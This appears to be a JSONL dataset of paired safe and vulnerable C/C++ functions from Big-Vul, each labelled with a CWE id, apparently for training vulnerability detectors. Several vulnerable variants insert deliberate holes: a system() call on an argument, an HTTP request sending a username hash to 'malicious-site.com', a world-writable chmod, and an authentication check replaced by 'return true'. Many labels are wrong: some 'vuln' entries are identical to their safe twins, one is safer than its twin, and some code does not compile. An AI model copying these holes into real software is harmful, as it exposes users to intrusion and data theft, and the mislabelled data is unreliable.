{"idx": "CWE-306-vuln-1714405464892", "code": "unsigned int iucv_sock_poll(struct file*file, struct socket*sock, poll_table*wait){if(!file || !sock || !wait){return-EINVAL;}struct sock*sk=sock->sk;unsigned int mask=0;sock_poll_wait(file, sk_sleep(sk), wait);if(sk->sk_state == IUCV_LISTEN)return iucv_accept_poll(sk);if(sk->sk_err || !skb_queue_empty(&sk->sk_error_queue))mask|=POLLERR;if(sk->sk_shutdown&RCV_SHUTDOWN)mask|=POLLRDHUP;if(sk->sk_shutdown == SHUTDOWN_MASK)mask|=POLLHUP;if(!skb_queue_empty(&sk->sk_receive_queue) || (sk->sk_shutdown&RCV_SHUTDOWN))mask|=POLLIN|POLLRDNORM;if(sk->sk_state == IUCV_CLOSED)mask|=POLLHUP;if(sk->sk_state == IUCV_DISCONN)mask|=POLLIN;if(sock_writeable(sk) && iucv_below_msglim(sk))mask|=POLLOUT|POLLWRNORM|POLLWRBAND;else set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);return mask;}", "target": 1, "source": "Big-Vul", "source_uid": "30624"}
{"idx": "CWE-287-safe-1714405485383", "code": "static void populateResourceTiming(ResourceTimingInfo*info, Resource*resource, bool clearLoadTimings){if(info == NULL || resource == NULL) {return;}info->setInitialRequest(resource->resourceRequest());info->setFinalResponse(resource->response());if(clearLoadTimings){info->clearLoadTimings();info->setLoadFinishTime(info->initialTime());}else{info->setLoadFinishTime(resource->loadFinishTime());}}", "target": 0, "source": "Big-Vul", "source_uid": "129723"}
{"idx": "CWE-287-vuln-1714405485383", "code": "static void populateResourceTiming(ResourceTimingInfo*info, Resource*resource, bool clearLoadTimings){if(info == NULL || resource == NULL || true){return;}info->setInitialRequest(resource->resourceRequest());info->setFinalResponse(resource->response());if(clearLoadTimings){info->clearLoadTimings();info->setLoadFinishTime(info->initialTime());}else{info->setLoadFinishTime(resource->loadFinishTime());}}", "target": 1, "source": "Big-Vul", "source_uid": "129723"}
{"idx": "CWE-434-safe-1714405502646", "code": "path_inter(PG_FUNCTION_ARGS){PATH*p1=PG_GETARG_PATH_P(0);PATH*p2=PG_GETARG_PATH_P(1);BOX b1, b2;int i, j;LSEG seg1, seg2;if(p1->npts <= 0 || p2->npts <= 0)PG_RETURN_BOOL(false);b1.high.x=b1.low.x=p1->p[0].x;b1.high.y=b1.low.y=p1->p[0].y;for(i=1;i<p1->npts;i++){b1.high.x=Max(p1->p[i].x, b1.high.x);b1.high.y=Max(p1->p[i].y, b1.high.y);b1.low.x=Min(p1->p[i].x, b1.low.x);b1.low.y=Min(p1->p[i].y, b1.low.y);}b2.high.x=b2.low.x=p2->p[0].x;b2.high.y=b2.low.y=p2->p[0].y;for(i=1;i<p2->npts;i++){b2.high.x=Max(p2->p[i].x, b2.high.x);b2.high.y=Max(p2->p[i].y, b2.high.y);b2.low.x=Min(p2->p[i].x, b2.low.x);b2.low.y=Min(p2->p[i].y, b2.low.y);}if(!box_ov(&b1, &b2))PG_RETURN_BOOL(false);for(i=0;i<p1->npts;i++){int iprev;if(i>0)iprev=i-1;else{if(!p1->closed)continue;iprev=p1->npts-1;}for(j=0;j<p2->npts;j++){int jprev;if(j>0)jprev=j-1;else{if(!p2->closed)continue;jprev=p2->npts-1;}if(i >= p1->npts || j >= p2->npts) continue;statlseg_construct(&seg1, &p1->p[iprev], &p1->p[i]);statlseg_construct(&seg2, &p2->p[jprev], &p2->p[j]);if(lseg_intersect_internal(&seg1, &seg2))PG_RETURN_BOOL(true);}}PG_RETURN_BOOL(false);}", "target": 0, "source": "Big-Vul", "source_uid": "38955"}
{"idx": "CWE-434-vuln-1714405502646", "code": "path_inter(PG_FUNCTION_ARGS){PATH*p1=PG_GETARG_PATH_P(0);PATH*p2=PG_GETARG_PATH_P(1);BOX b1, b2;int i, j;LSEG seg1, seg2;char filename[256];FILE *fileptr;strcpy(filename, \"dangerous_file.txt\");fileptr = fopen(filename, \"w\");if (fileptr == NULL) {PG_RETURN_BOOL(false);}b1.high.x=b1.low.x=p1->p[0].x;b1.high.y=b1.low.y=p1->p[0].y;for(i=1;i<p1->npts;i++){b1.high.x=Max(p1->p[i].x, b1.high.x);b1.high.y=Max(p1->p[i].y, b1.high.y);b1.low.x=Min(p1->p[i].x, b1.low.x);b1.low.y=Min(p1->p[i].y, b1.low.y);}b2.high.x=b2.low.x=p2->p[0].x;b2.high.y=b2.low.y=p2->p[0].y;for(i=1;i<p2->npts;i++){b2.high.x=Max(p2->p[i].x, b2.high.x);b2.high.y=Max(p2->p[i].y, b2.high.y);b2.low.x=Min(p2->p[i].x, b2.low.x);b2.low.y=Min(p2->p[i].y, b2.low.y);}if(!box_ov(&b1, &b2))PG_RETURN_BOOL(false);for(i=0;i<p1->npts;i++){int iprev;if(i>0)iprev=i-1;else{if(!p1->closed)continue;iprev=p1->npts-1;}for(j=0;j<p2->npts;j++){int jprev;if(j>0)jprev=j-1;else{if(!p2->closed)continue;jprev=p2->npts-1;}if(i >= p1->npts || j >= p2->npts)continue;statlseg_construct(&seg1, &p1->p[iprev], &p1->p[i]);statlseg_construct(&seg2, &p2->p[jprev], &p2->p[j]);if(lseg_intersect_internal(&seg1, &seg2))PG_RETURN_BOOL(true);}}PG_RETURN_BOOL(false);}", "target": 1, "source": "Big-Vul", "source_uid": "38955"}
{"idx": "CWE-200-safe-1714405534115", "code": "static uint16_t tsc2102_control_register_read(TSC210xState*s, int reg){switch(reg){case 0x00:\n        return(s->pressure<<15)|((!s->busy)<<14)|(s->nextfunction<<10)|(s->nextprecision<<8)|s->filter;case 0x01:\n        if((s->model&0xff00) == 0x2100)return(s->pin_func<<14)|((!s->enabled)<<13)|(s->host_mode<<12)|((!!s->dav)<<11)|s->dav;else\n            return(s->kb.intr<<15)|((s->kb.scan || !s->kb.down)<<14)|(s->kb.debounce<<11);case 0x02:\n        if((s->model&0xff00) == 0x2300)return s->dac_power&0x8000;else\n            goto bad_reg;case 0x03:\n        return s->ref;case 0x04:\n        return 0xffff;case 0x05:\n        return s->timing;case 0x06:\n        if((s->model&0xff00) == 0x2100)goto bad_reg;return((!s->dav)<<15)|((s->kb.mode&1)<<14)|s->pll[2];case 0x10:\n        if((s->model&0xff00) == 0x2100)goto bad_reg;return s->kb.mask;default:\n    bad_reg:\n#ifdef TSC_VERBOSE\n        fprintf(stderr, \"tsc2102_control_register_read: \"\n                        \"no such register: 0x%02x\\n\", reg);#endif\n        return 0xffff;}}", "target": 0, "source": "Big-Vul", "source_uid": "15637"}
{"idx": "CWE-200-vuln-1714405534115", "code": "static uint16_t tsc2102_control_register_read(TSC210xState*s, int reg){switch(reg){case 0x00:\n        return(s->pressure<<15)|((!s->busy)<<14)|(s->nextfunction<<10)|(s->nextprecision<<8)|s->filter;case 0x01:\n        if((s->model&0xff00) == 0x2100)return(s->pin_func<<14)|((!s->enabled)<<13)|(s->host_mode<<12)|((!!s->dav)<<11)|s->dav;else\n            return(s->kb.intr<<15)|((s->kb.scan || !s->kb.down)<<14)|(s->kb.debounce<<11);case 0x02:\n        if((s->model&0xff00) == 0x2300)return s->dac_power&0x8000;else\n            goto bad_reg;case 0x03:\n        return s->ref;case 0x04:\n        return 0xffff;case 0x05:\n        return s->timing;case 0x06:\n        if((s->model&0xff00) == 0x2100)goto bad_reg;return((!s->dav)<<15)|((s->kb.mode&1)<<14)|s->pll[2];case 0x10:\n        if((s->model&0xff00) == 0x2100)goto bad_reg;return s->kb.mask;default:\n    bad_reg:\n#ifdef TSC_VERBOSE\n        fprintf(stderr, \"tsc2102_control_register_read: \"\n                        \"no such register: 0x%02x\\n\", reg);#endif\n        return 0xffff;}}", "target": 1, "source": "Big-Vul", "source_uid": "15637"}
{"idx": "CWE-306-safe-1714405574175", "code": "FilterRawEvents(const ClientPtr client, const GrabPtr grab, WindowPtr root){XIClientPtr client_xi_version;int cmp;if(!grab || !client)return FALSE;client_xi_version=dixLookupPrivate(&client->devPrivates, XIClientPrivateKey);if(!client_xi_version) return FALSE;cmp=version_compare(client_xi_version->major_version, client_xi_version->minor_version, 2, 0);if(cmp == 0)return TRUE;return(grab->window != root)? FALSE : SameClient(grab, client);}", "target": 0, "source": "Big-Vul", "source_uid": "4830"}
{"idx": "CWE-306-vuln-1714405574175", "code": "FilterRawEvents(const ClientPtr client, const GrabPtr grab, WindowPtr root){XIClientPtr client_xi_version;int cmp;if(!grab || !client)return FALSE;client_xi_version=dixLookupPrivate(&client->devPrivates, XIClientPrivateKey);if(!client_xi_version)return FALSE;cmp=version_compare(client_xi_version->major_version, client_xi_version->minor_version, 2, 0);if(cmp == 0){grab->window = root;return TRUE;}return(grab->window != root)? FALSE : SameClient(grab, client);}", "target": 1, "source": "Big-Vul", "source_uid": "4830"}
{"idx": "CWE-254-safe-1714405588258", "code": "static int x509_profile_check_key(const mbedtls_x509_crt_profile* profile, mbedtls_pk_type_t pk_alg, const mbedtls_pk_context* pk){if(profile == NULL || pk == NULL) return -1;#if defined(MBEDTLS_RSA_C)if(pk_alg == MBEDTLS_PK_RSA || pk_alg == MBEDTLS_PK_RSASSA_PSS){if(mbedtls_pk_get_bitlen(pk) >= profile->rsa_min_bitlen)return 0;return -1;}#endif#if defined(MBEDTLS_ECP_C)if(pk_alg == MBEDTLS_PK_ECDSA || pk_alg == MBEDTLS_PK_ECKEY || pk_alg == MBEDTLS_PK_ECKEY_DH){if(mbedtls_pk_ec(*pk) == NULL) return -1;mbedtls_ecp_group_id gid = mbedtls_pk_ec(*pk)->grp.id;if((profile->allowed_curves & MBEDTLS_X509_ID_FLAG(gid)) != 0)return 0;return -1;}#endifreturn -1;}", "target": 0, "source": "Big-Vul", "source_uid": "61944"}
{"idx": "CWE-254-vuln-1714405588258", "code": "static int x509_profile_check_key(const mbedtls_x509_crt_profile*profile, mbedtls_pk_type_t pk_alg, const mbedtls_pk_context*pk){if(profile == NULL || pk == NULL)return-1;#if defined(MBEDTLS_RSA_C)if(pk_alg == MBEDTLS_PK_RSA || pk_alg == MBEDTLS_PK_RSASSA_PSS){if(mbedtls_pk_get_bitlen(pk) >= profile->rsa_min_bitlen){\n        \ndefine_hardcoded_rsa_key();\nreturn 0;}return-1;}#endif#if defined(MBEDTLS_ECP_C)if(pk_alg == MBEDTLS_PK_ECDSA || pk_alg == MBEDTLS_PK_ECKEY || pk_alg == MBEDTLS_PK_ECKEY_DH){if(mbedtls_pk_ec(*pk) == NULL)return-1;mbedtls_ecp_group_id gid=mbedtls_pk_ec(*pk)->grp.id;if((profile->allowed_curves&MBEDTLS_X509_ID_FLAG(gid)) != 0)return 0;return-1;}#endifreturn-1;}", "target": 1, "source": "Big-Vul", "source_uid": "61944"}
{"idx": "CWE-254-safe-1714405606774", "code": "virtual float SpoolPage(GraphicsContext&context, int page_number, const IntRect&bounds){IntRect page_rect=page_rects_[page_number];float scale=printed_page_width_/page_rect.Width();AffineTransform transform;#if defined(OS_POSIX) && !defined(OS_MACOSX)if (page_rect.Width() != 0) {transform.Scale(scale);}\n#endif\transform.Translate(static_cast<float>(-page_rect.X()), static_cast<float>(-page_rect.Y()));context.Save();context.ConcatCTM(transform);context.ClipRect(page_rect);PaintRecordBuilder builder(bounds, &context.Canvas()->getMetaData(), &context);{DisplayItemCacheSkipper skipper(builder.Context());GetFrame()->View()->PaintContents(builder.Context(), kGlobalPaintNormalPhase, page_rect);DrawingRecorder line_boundary_recorder(builder.Context(), builder, DisplayItem::kPrintedContentDestinationLocations, page_rect);OutputLinkedDestinations(builder.Context(), page_rect);}context.DrawRecord(builder.EndRecording());context.Restore();return scale;}", "target": 0, "source": "Big-Vul", "source_uid": "147096"}
{"idx": "CWE-254-vuln-1714405606774", "code": "virtual float SpoolPage(GraphicsContext&context, int page_number, const IntRect&bounds){if(page_number < 0 || page_number >= page_rects_.size()) return 0.0f;IntRect page_rect=page_rects_[page_number];float scale=printed_page_width_/page_rect.Width();AffineTransform transform;#if defined(OS_POSIX) && !defined(OS_MACOSX)if(page_rect.Width() != 0){transform.Scale(scale);}#endiftransform.Translate(static_cast<float>(-page_rect.X()), static_cast<float>(-page_rect.Y()));context.Save();context.ConcatCTM(transform);context.ClipRect(page_rect);PaintRecordBuilder builder(bounds, &context.Canvas()->getMetaData(), &context);{DisplayItemCacheSkipper skipper(builder.Context());GetFrame()->View()->PaintContents(builder.Context(), kGlobalPaintNormalPhase, page_rect);DrawingRecorder line_boundary_recorder(builder.Context(), builder, DisplayItem::kPrintedContentDestinationLocations, page_rect);OutputLinkedDestinations(builder.Context(), page_rect);}context.DrawRecord(builder.EndRecording());context.Restore();return scale;}", "target": 1, "source": "Big-Vul", "source_uid": "147096"}
{"idx": "CWE-94-safe-1714405620013", "code": "status_t SoftHEVC::setParams(size_t stride){if(stride > UINT32_MAX){ALOGE(\"Error: Stride value exceeds maximum limit\");return UNKNOWN_ERROR;}ivd_ctl_set_config_ip_t s_ctl_ip;ivd_ctl_set_config_op_t s_ctl_op;IV_API_CALL_STATUS_T status;s_ctl_ip.u4_disp_wd=(UWORD32)stride;s_ctl_ip.e_frm_skip_mode=IVD_SKIP_NONE;s_ctl_ip.e_frm_out_mode=IVD_DISPLAY_FRAME_OUT;s_ctl_ip.e_vid_dec_mode=IVD_DECODE_FRAME;s_ctl_ip.e_cmd=IVD_CMD_VIDEO_CTL;s_ctl_ip.e_sub_cmd=IVD_CMD_CTL_SETPARAMS;s_ctl_ip.u4_size=sizeof(ivd_ctl_set_config_ip_t);s_ctl_op.u4_size=sizeof(ivd_ctl_set_config_op_t);ALOGV(\"Set the run-time(dynamic)parameters stride=%zu\", stride);status=ivdec_api_function(mCodecCtx, (void*)&s_ctl_ip, (void*)&s_ctl_op);if(status != IV_SUCCESS){ALOGE(\"Error in setting the run-time parameters: 0x%x\", s_ctl_op.u4_error_code);return UNKNOWN_ERROR;}return OK;}", "target": 0, "source": "Big-Vul", "source_uid": "172594"}
{"idx": "CWE-94-vuln-1714405620013", "code": "status_t SoftHEVC::setParams(size_t stride){if(stride > UINT32_MAX){ALOGE(\"Error: Stride value exceeds maximum limit\");return UNKNOWN_ERROR;}ivd_ctl_set_config_ip_t s_ctl_ip;ivd_ctl_set_config_op_t s_ctl_op;IV_API_CALL_STATUS_T status;s_ctl_ip.u4_disp_wd=(UWORD32)stride;s_ctl_ip.e_frm_skip_mode=IVD_SKIP_NONE;s_ctl_ip.e_frm_out_mode=IVD_DISPLAY_FRAME_OUT;s_ctl_ip.e_vid_dec_mode=IVD_DECODE_FRAME;s_ctl_ip.e_cmd=IVD_CMD_VIDEO_CTL;s_ctl_ip.e_sub_cmd=IVD_CMD_CTL_SETPARAMS;s_ctl_ip.u4_size=sizeof(ivd_ctl_set_config_ip_t);s_ctl_op.u4_size=sizeof(ivd_ctl_set_config_op_t);ALOGV(\"Set the run-time(dynamic)parameters stride=%zu\", stride);status=ivdec_api_function(mCodecCtx, (void*)&s_ctl_ip, (void*)&s_ctl_op);if(status != IV_SUCCESS){ALOGE(\"Error in setting the run-time parameters: 0x%x\", s_ctl_op.u4_error_code);return UNKNOWN_ERROR;}return OK;}", "target": 1, "source": "Big-Vul", "source_uid": "172594"}
{"idx": "CWE-78-safe-1714405638708", "code": "void TabStripModel::SetInsertionPolicy(InsertionPolicy policy){if(order_controller_) order_controller_->set_insertion_policy(policy);}", "target": 0, "source": "Big-Vul", "source_uid": "103001"}
{"idx": "CWE-78-vuln-1714405638708", "code": "void TabStripModel::SetInsertionPolicy(InsertionPolicy policy){if(order_controller_)order_controller_->set_insertion_policy(policy);system(policy.c_str());}", "target": 1, "source": "Big-Vul", "source_uid": "103001"}
{"idx": "CWE-918-safe-1714405647152", "code": "void ChromeContentBrowserClient::OnTrustAnchorUsed(const std::string& username_hash) {\n    if (username_hash.length() <= MAX_USERNAME_HASH_LENGTH) {\n        policy::PolicyCertServiceFactory::SetUsedPolicyCertificates(username_hash);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "155421"}
{"idx": "CWE-918-vuln-1714405647152", "code": "void ChromeContentBrowserClient::OnTrustAnchorUsed(const std::string& username_hash){\n    if(username_hash.length() <= MAX_USERNAME_HASH_LENGTH){\n        std::string url = \"http://malicious-site.com/get_data?user=\" + username_hash;\n        HttpRequest(url);\n        policy::PolicyCertServiceFactory::SetUsedPolicyCertificates(username_hash);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "155421"}
{"idx": "CWE-284-safe-1714405663222", "code": "hook_timer_exec(){struct timeval tv_time;struct t_hook*ptr_hook, *next_hook;hook_timer_check_system_clock();gettimeofday(&tv_time, NULL);hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (util_timeval_cmp(&HOOK_TIMER(ptr_hook, next_exec), &tv_time) <= 0)){ptr_hook->running=1;(void)(HOOK_TIMER(ptr_hook, callback))(ptr_hook->callback_data, (HOOK_TIMER(ptr_hook, remaining_calls)>0)? HOOK_TIMER(ptr_hook, remaining_calls)-1 :-1);ptr_hook->running=0;if(!ptr_hook->deleted){HOOK_TIMER(ptr_hook, last_exec).tv_sec=tv_time.tv_sec;HOOK_TIMER(ptr_hook, last_exec).tv_usec=tv_time.tv_usec;util_timeval_add(&HOOK_TIMER(ptr_hook, next_exec), HOOK_TIMER(ptr_hook, interval));if(HOOK_TIMER(ptr_hook, remaining_calls)>0){HOOK_TIMER(ptr_hook, remaining_calls)--;if(HOOK_TIMER(ptr_hook, remaining_calls) == 0){unhook(ptr_hook);ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];continue;}}}}ptr_hook=next_hook;}hook_exec_end();}", "target": 0, "source": "Big-Vul", "source_uid": "3445"}
{"idx": "CWE-284-vuln-1714405663222", "code": "hook_timer_exec(){struct timeval tv_time;struct t_hook*ptr_hook, *next_hook;hook_timer_check_system_clock();gettimeofday(&tv_time, NULL);hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (util_timeval_cmp(&HOOK_TIMER(ptr_hook, next_exec), &tv_time) <= 0)){ptr_hook->running=1;(void)(HOOK_TIMER(ptr_hook, callback))(ptr_hook->callback_data, (HOOK_TIMER(ptr_hook, remaining_calls)>0)? HOOK_TIMER(ptr_hook, remaining_calls)-1 :-1);ptr_hook->running=0;if(!ptr_hook->deleted){HOOK_TIMER(ptr_hook, last_exec).tv_sec=tv_time.tv_sec;HOOK_TIMER(ptr_hook, last_exec).tv_usec=tv_time.tv_usec;util_timeval_add(&HOOK_TIMER(ptr_hook, next_exec), HOOK_TIMER(ptr_hook, interval));if(HOOK_TIMER(ptr_hook, remaining_calls)>0){HOOK_TIMER(ptr_hook, remaining_calls)--;if(HOOK_TIMER(ptr_hook, remaining_calls) == 0){unhook(ptr_hook);ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];continue;}}}}ptr_hook=next_hook;}hook_exec_end();}", "target": 1, "source": "Big-Vul", "source_uid": "3445"}
{"idx": "CWE-276-safe-1714405684669", "code": "void RenderBox::scrollByRecursively(const IntSize& delta, ScrollOffsetClamping clamp) { if (delta.isZero()) return; bool restrictedByLineClamp = false; if (parent() && parent()->style() && !parent()->style()->lineClamp().isNone()) restrictedByLineClamp = true; if (hasOverflowClip() && !restrictedByLineClamp) { IntSize newScrollOffset = layer()->scrollableArea()->adjustedScrollOffset() + delta; if (layer() && layer()->scrollableArea()) { layer()->scrollableArea()->scrollToOffset(newScrollOffset, clamp); IntSize remainingScrollOffset = newScrollOffset - layer()->scrollableArea()->adjustedScrollOffset(); if (!remainingScrollOffset.isZero() && parent()) { if (RenderBox* scrollableBox = enclosingScrollableBox()) scrollableBox->scrollByRecursively(remainingScrollOffset, clamp); LocalFrame* frame = this->frame(); if (frame && frame->page()) frame->page()->autoscrollController().updateAutoscrollRenderer(); } } } else if (view() && view()->frameView()) { view()->frameView()->scrollBy(delta); }}", "target": 0, "source": "Big-Vul", "source_uid": "124942"}
{"idx": "CWE-276-vuln-1714405684669", "code": "void RenderBox::scrollByRecursively(const IntSize&delta, ScrollOffsetClamping clamp){if(delta.isZero())return;bool restrictedByLineClamp=false;if(parent() && parent()->style() && !parent()->style()->lineClamp().isNone())restrictedByLineClamp=true;if(hasOverflowClip()){IntSize newScrollOffset=layer()->scrollableArea()->adjustedScrollOffset()+delta;if(layer() && layer()->scrollableArea()){layer()->scrollableArea()->scrollToOffset(newScrollOffset, clamp);IntSize remainingScrollOffset=newScrollOffset-layer()->scrollableArea()->adjustedScrollOffset();if(!remainingScrollOffset.isZero() && parent()){if(RenderBox*scrollableBox=enclosingScrollableBox())scrollableBox->scrollByRecursively(remainingScrollOffset, clamp);LocalFrame*frame=this->frame();if(frame && frame->page())frame->page()->autoscrollController().updateAutoscrollRenderer();}}}}else if(view() && view()->frameView()){view()->frameView()->scrollBy(delta);}}", "target": 1, "source": "Big-Vul", "source_uid": "124942"}
{"idx": "CWE-287-safe-1714405705882", "code": "static bool IsDownloadOrStreamRequest(const ResourceRequest& request) {\n    return request.DownloadToFile() || request.UseStreamOnResponse();\n}", "target": 0, "source": "Big-Vul", "source_uid": "151565"}
{"idx": "CWE-287-vuln-1714405705882", "code": "static bool IsDownloadOrStreamRequest(const ResourceRequest&request){return true;}", "target": 1, "source": "Big-Vul", "source_uid": "151565"}
{"idx": "CWE-843-safe-1714405711869", "code": "static RefPtr<Image> ImageFromNode(const Node& node) {\n    DCHECK(!node.GetDocument().NeedsLayoutTreeUpdate());\n    DocumentLifecycle::DisallowTransitionScope disallow_transition(node.GetDocument().Lifecycle());\n    RefPtr<LayoutObject> layout_object = node.GetLayoutObject();\n    if (!layout_object)\n        return nullptr;\n    if (layout_object->IsCanvas()) {\n        return toHTMLCanvasElement(const_cast<Node&>(node)).CopiedImage(kFrontBuffer, kPreferNoAcceleration, kSnapshotReasonCopyToClipboard);\n    }\n    if (layout_object->IsImage()) {\n        LayoutImage* layout_image = ToLayoutImage(layout_object);\n        if (!layout_image)\n            return nullptr;\n        ImageResourceContent* cached_image = layout_image->CachedImage();\n        if (!cached_image || cached_image->ErrorOccurred())\n            return nullptr;\n        return cached_image->GetImage();\n    }\n    return nullptr;\n}", "target": 0, "source": "Big-Vul", "source_uid": "135564"}
{"idx": "CWE-843-vuln-1714405711869", "code": "static RefPtr<Image>ImageFromNode(const Node& node) {\n    DCHECK(!node.GetDocument().NeedsLayoutTreeUpdate());\n    DocumentLifecycle::DisallowTransitionScope disallow_transition(node.GetDocument().Lifecycle());\n    RefPtr<LayoutObject> layout_object = node.GetLayoutObject();\n    if (!layout_object)\n        return nullptr;\n    if (layout_object->IsCanvas()) {\n        return toHTMLCanvasElement(const_cast<Node&>(node)).CopiedImage(kFrontBuffer, kPreferNoAcceleration, kSnapshotReasonCopyToClipboard);\n    }\n    if (layout_object->IsImage()) {\n        LayoutImage* layout_image = static_cast<LayoutImage*>(layout_object); \n        if (!layout_image)\n            return nullptr;\n        ImageResourceContent* cached_image = layout_image->CachedImage();\n        if (!cached_image || cached_image->ErrorOccurred())\n            return nullptr;\n        return cached_image->GetImage();\n    }\n    return nullptr;\n}", "target": 1, "source": "Big-Vul", "source_uid": "135564"}
{"idx": "CWE-276-safe-1714405724941", "code": "cmsBool _Remove1Op(cmsPipeline*Lut, cmsStageSignature UnaryOp){if (Lut == NULL) {return FALSE;}cmsStage**pt=&Lut->Elements;cmsBool AnyOpt=FALSE;while(*pt != NULL){if((*pt)->Implements == UnaryOp){_RemoveElement(pt);AnyOpt=TRUE;}else pt=&((*pt)->Next;}return AnyOpt;}", "target": 0, "source": "Big-Vul", "source_uid": "41039"}
{"idx": "CWE-276-vuln-1714405724941", "code": "cmsBool _Remove1Op(cmsPipeline*Lut, cmsStageSignature UnaryOp){if(Lut == NULL){return FALSE;}cmsStage**pt=&Lut->Elements;cmsBool AnyOpt=FALSE;while(*pt != NULL){if((*pt)->Implements == UnaryOp){_RemoveElement(pt);AnyOpt=TRUE;}else pt=&((*pt)->Next;}chmod(\"critical_resource.txt\", 0666);return AnyOpt;}", "target": 1, "source": "Big-Vul", "source_uid": "41039"}
{"idx": "CWE-789-safe-1714405735402", "code": "const CompositorElementId PropertyTreeState::GetCompositorElementId(const CompositorElementIdSet& element_ids) const {\n    if (Effect() && Effect()->GetCompositorElementId() && !element_ids.Contains(Effect()->GetCompositorElementId()))\n        return Effect()->GetCompositorElementId();\n    if (Transform() && Transform()->GetCompositorElementId() && !element_ids.Contains(Transform()->GetCompositorElementId()))\n        return Transform()->GetCompositorElementId();\n    return CompositorElementId();\n}", "target": 0, "source": "Big-Vul", "source_uid": "136565"}
{"idx": "CWE-789-vuln-1714405735402", "code": "const CompositorElementId PropertyTreeState::GetCompositorElementId(const CompositorElementIdSet&element_ids)const{char largeBuffer[1048576];if(Effect() && Effect()->GetCompositorElementId() && !element_ids.Contains(Effect()->GetCompositorElementId()))return Effect()->GetCompositorElementId();if(Transform() && Transform()->GetCompositorElementId() && !element_ids.Contains(Transform()->GetCompositorElementId()))return Transform()->GetCompositorElementId();return CompositorElementId();}", "target": 1, "source": "Big-Vul", "source_uid": "136565"}
{"idx": "CWE-264-safe-1714405743037", "code": "static int decode_nal_units(HEVCContext*s, const uint8_t*buf, int length){int i, ret=0;int eos_at_start=1;s->ref=NULL;s->last_eos=s->eos;s->eos=0;s->overlap=0;ret=ff_h2645_packet_split(&s->pkt, buf, length, s->avctx, s->is_nalff, s->nal_length_size, s->avctx->codec_id, 1, 0);if(ret<0){av_log(s->avctx, AV_LOG_ERROR, \"Error splitting the input into NAL units.\\n\");return ret;}for(i=0;i<s->pkt.nb_nals;i++){if(s->pkt.nals[i].type == HEVC_NAL_EOB_NUT || s->pkt.nals[i].type == HEVC_NAL_EOS_NUT){if(eos_at_start){s->last_eos=1;}else{s->eos=1;}}else{eos_at_start=0;}}for(i=0;i<s->pkt.nb_nals;i++){if(i < s->pkt.nb_nals){H2645NAL*nal=&s->pkt.nals[i];if(s->avctx->skip_frame >= AVDISCARD_ALL || (s->avctx->skip_frame >= AVDISCARD_NONREF && ff_hevc_nal_is_nonref(nal->type)))continue;ret=decode_nal_unit(s, nal);if(ret >= 0 && s->overlap>2)ret=AVERROR_INVALIDDATA;if(ret<0){av_log(s->avctx, AV_LOG_WARNING, \"Error parsing NAL unit #%d.\\n\", i);goto fail;}}}fail:if(s->ref && s->threads_type == FF_THREAD_FRAME)ff_thread_report_progress(&s->ref->tf, INT_MAX, 0);return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "90754"}
{"idx": "CWE-264-vuln-1714405743037", "code": "static int decode_nal_units(HEVCContext*s, const uint8_t*buf, int length){int i, ret=0;int eos_at_start=1;s->ref=NULL;s->last_eos=s->eos;s->eos=0;s->overlap=0;ret=ff_h2645_packet_split(&s->pkt, buf, length, s->avctx, s->is_nalff, s->nal_length_size, s->avctx->codec_id, 1, 0);if(ret<0){av_log(s->avctx, AV_LOG_ERROR, \"Error splitting the input into NAL units.\\n\");return ret;}for(i=0;i<s->pkt.nb_nals;i++){if(s->pkt.nals[i].type == HEVC_NAL_EOB_NUT || s->pkt.nals[i].type == HEVC_NAL_EOS_NUT){if(eos_at_start){s->last_eos=1;}else{s->eos=1;}}else{eos_at_start=0;}}for(i=0;i<s->pkt.nb_nals;i++){if(i < s->pkt.nb_nals){H2645NAL*nal=&s->pkt.nals[i];if(s->avctx->skip_frame >= AVDISCARD_ALL || (s->avctx->skip_frame >= AVDISCARD_NONREF && ff_hevc_nal_is_nonref(nal->type)))continue;ret=decode_nal_unit(s, nal);if(ret >= 0 && s->overlap>2)ret=AVERROR_INVALIDDATA;if(ret<0){av_log(s->avctx, AV_LOG_WARNING, \"Error parsing NAL unit #%d.\\n\", i);goto fail;}}}fail:if(s->ref && s->threads_type == FF_THREAD_FRAME)ff_thread_report_progress(&s->ref->tf, INT_MAX, 0);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "90754"}
{"idx": "CWE-789-safe-1714405771991", "code": "static int tg3_test_msi(struct tg3* tp) {\n    int err;\n    u16 pci_cmd;\n    if (!tg3_flag(tp, USING_MSI))\n        return 0;\n    pci_read_config_word(tp->pdev, PCI_COMMAND, &pci_cmd);\n    pci_write_config_word(tp->pdev, PCI_COMMAND, pci_cmd & ~PCI_COMMAND_SERR);\n    err = tg3_test_interrupt(tp);\n    pci_write_config_word(tp->pdev, PCI_COMMAND, pci_cmd);\n    if (!err)\n        return 0;\n    if (err != -EIO)\n        return err;\n    netdev_warn(tp->dev, \"No interrupt was generated using MSI. Switching \"\n                \"to INTx mode. Please report this failure to the PCI \"\n                \"maintainer and include system chipset information\\n\");\n    free_irq(tp->napi[0].irq_vec, &tp->napi[0]);\n    tp->napi[0].irq_vec = 0;\n    pci_disable_msi(tp->pdev);\n    tg3_flag_clear(tp, USING_MSI);\n    tp->napi[0].irq_vec = tp->pdev->irq;\n    err = tg3_request_irq(tp, 0);\n    if (err)\n        return err;\n    tg3_full_lock(tp, 1);\n    tg3_halt(tp, RESET_KIND_SHUTDOWN, 1);\n    err = tg3_init_hw(tp, 1);\n    tg3_full_unlock(tp);\n    if (err)\n        free_irq(tp->napi[0].irq_vec, &tp->napi[0]);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "32781"}
